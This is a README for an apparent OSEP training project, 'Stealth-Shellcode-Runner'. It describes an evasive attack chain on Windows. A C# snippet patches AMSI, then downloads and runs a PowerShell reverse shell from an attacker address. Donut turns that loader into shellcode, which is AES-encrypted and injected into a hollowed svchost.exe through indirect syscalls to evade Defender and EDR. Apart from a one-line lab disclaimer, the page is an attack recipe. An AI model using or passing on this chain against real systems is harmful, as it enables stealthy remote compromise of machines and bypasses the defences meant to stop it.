# Stealth-Shellcode-Runner

# 🔒 Advanced Shellcode Execution via Process Hollowing and AES Encryption

This project demonstrates a stealthy approach to executing an AES-encrypted PowerShell reverse shell using a custom C# loader, `donut` for shellcode generation, and a custom runner using **indirect syscalls** and **process hollowing** techniques.

---

## 🧩 Step 1 - Build the PowerShell Loader (`Project_Stealth.cs`)

Create a minimal C# console project and include the following logic to:
- Patch AMSI via `.NET Reflection`
- Download and execute a PowerShell payload (e.g., reverse shell)
- Use base64 obfuscation for script names

📌 **Note:** You must manually add a reference to:
```
C:\Program Files\WindowsPowerShell\Modules\PowerShellGet\<version>\System.Management.Automation.dll
```

### Core logic:
```csharp
// AMSI bypass + remote script execution
string attackerIP = "192.168.1.94";
PatchAMSI();
string psUrl = $"http://{attackerIP}/shell.ps1";
string psScript = GetStringFromUrl(psUrl);
ExecutePowerShell(psScript);
```

---

## 🧪 Step 2 - Generate Shellcode with Donut

Use [Donut](https://github.com/TheWover/donut) to convert the compiled loader into shellcode:

```bash
.\donut.exe -i "Project_Stealth.exe" -a 2 -f 1 -o shellcode.bin
```

- `-a 2`: Target .NET assemblies
- `-f 1`: Run the .NET assembly as unmanaged shellcode

---

## 🔐 Step 3 - AES Encrypt the Shellcode

Use this Python script to AES-encrypt the generated shellcode and format the output as C# byte arrays for easy pasting:

Paste the arrays into your Process Hollowing runner.

---

## 🧠 Step 4 - Execute with Advanced Process Hollowing + Indirect Syscalls

Use the included `ShellCode_Runner.cs` script to:

- Create a suspended process (`svchost.exe`)
- Allocate RWX memory via **indirect syscall**
- Write and decrypt AES shellcode
- Change protection and execute via `NtCreateThreadEx` (indirect syscall)

All syscalls (`NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, etc.) are resolved at runtime and executed from memory stubs to evade AV/EDR.

📌 Replace the following placeholders with your encrypted values:

```csharp
byte[] encryptedShellcode = new byte[] { ... };
byte[] aesKey = new byte[] { ... };
byte[] aesIV = new byte[] { ... };
```

---

## ✅ Result

- AMSI patched silently
- Reverse shell loaded via PowerShell (downloaded at runtime)
- Shellcode encrypted, injected, and executed stealthily
- Full evasion of Defender in OSEP lab environments

---

**Built for OSEP training purposes. Use only in lab environments.**
